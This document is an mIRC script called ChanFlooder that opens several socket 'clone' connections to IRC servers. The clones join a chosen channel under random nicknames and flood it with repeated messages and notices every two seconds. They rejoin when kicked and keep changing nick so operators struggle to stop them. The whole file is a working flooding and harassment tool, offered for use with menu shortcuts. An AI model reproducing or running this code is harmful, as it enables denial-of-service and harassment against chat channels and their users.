;ChanFlooder v5.0 by ShakE
;Make crazy clone floods on channels
;All Copyrights reserved!
;For more addons visit http://xsoft.hit.bg
;For questions and bugs mailto: shake@haho.org

on *:load:{
/echo -a Channel Clone Flooder by ShakE
/echo -a Usage: /chanflood <#channel> [message]
}
alias chanflood {
 if ($1 !== $null) { /cloneflood $1 }
 else { /echo -a Please Enter a Channel! }
}
alias cloneflood {
 if ($1 == $null) { /echo -a Please Enter a Channel! | halt }
  /set %floodchannel $1
  if ($2 !== $null) { /set %floodmsg $2- }
  elseif ($2 == $null) { /set %floodmsg 4,8FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D 12,4FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D FL000D }
  /set %cloneznum $?="Kolko kloninga da pusna (ne pove4e ot 10 !!!)"
  if (%cloneznum == $null) { /set %cloneznum 5 }  
  //.timerrunflooderz %cloneznum 0 /openclonesock
  /echo -a Flooding %floodchannel with %cloneznum clonez with message %floodmsg
  /echo -a To stop the flood Push Ctrl+F9 or type /floodoff
}
alias cF9 /floodoff
alias floodoff {
  /timersockflood* off
  /sockclose chanflooder*
  /unset %floodchannel
  /unset %floodmsg
  /unset %flood.temp  
  /echo -a 4Channel CloneFlooderz-> OFF
}
alias openclonesock {
  /sockopen chanflooder $+ $rand(0,99999) $read $scriptdircloneservers.txt 6667
}
alias sockrandnick {
  /sockwrite -nt $1 nick $rand(a,z) $+ $rand(A,Z) $+ $rand(0,999) $+ $rand(a,z)
}

;remotes
on *:sockopen:chanflooder*:{
  if ($sockerr > 0) { return }
  set -u1 %fuser $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
  sockwrite -nt $sockname user %fuser %fuser %fuser  : $+ %fuser
  sockwrite -nt $sockname nick $rand(a,z) $+ $rand(A,Z) $+ $rand(0,999) $+ $rand(a,z)
  sockwrite -tn $sockname join %floodchannel
  //.timersockfloodnick $+ $sockname 0 2 /sockrandnick $sockname
  //.timersockfloodmsg  $+ $sockname 0 2 /sockwrite -n $sockname privmsg %floodchannel : $+ %floodmsg
  //.timersockfloodnotice $+ $sockname 0 2 /sockwrite -n $sockname notice %floodchannel : $+ %floodmsg
}
on *:sockread:chanflood*:{ 
  .sockread %flood.temp 
  if ($gettok(%flood.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } 
  if ($gettok(%flood.temp,2,32) == KICK) { sockwrite -tn $sockname join %floodchannel }
}
;menus
menu menubar {
 ChanFlooder:/cloneflood $?="Enter #channel to flood:"
}
menu channel {
 ChanFlooder:{
  if ( $?!="Are you sure you want to flood $chan ?" == $true ) { /cloneflood $chan }
 }
}
